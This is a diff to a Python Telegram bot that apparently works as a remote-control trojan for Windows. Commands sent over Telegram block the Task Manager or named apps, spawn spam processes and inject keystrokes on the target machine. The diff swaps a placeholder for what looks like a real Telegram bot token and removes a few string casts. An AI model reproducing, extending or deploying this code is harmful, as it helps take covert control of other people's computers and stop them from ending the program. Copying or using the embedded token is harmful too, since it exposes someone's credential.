@@ -20,7 +20,7 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
 import pyperclip
 
-bot_token = 'your bot token from -> @BotFather'
+bot_token = '7615104148:AAFk0NVPm-tpooR-83rY7tpFHr0K58VpIHk'
 bot = telebot.TeleBot(bot_token)
 
 cmd_spam_processes = []
@@ -159,7 +159,7 @@ def block_task_manager(message):
             return
         
         start_app_block = True
-        app_name = str(args[1])
+        app_name = args[1]
         threading.Thread(target=block_keys, args=(app_name,), daemon=True).start()
         bot.send_message(message.chat.id, f"{app_name} is blocked now.")
     except Exception as e:
@@ -285,7 +285,7 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /keyboard word/letter")
             return
 
-        klavisha = str(args[1])
+        klavisha = args[1]
 
         if len(klavisha) > 1:
             letter = False
@@ -309,7 +309,7 @@ def move_mousik(message):
             bot.send_message(message.chat.id, "Usage: /keyboard_spam word/letter")
             return
 
-        klavisha = str(args[1])
+        klavisha = args[1]
 
         if len(klavisha) > 1:
             letter = False
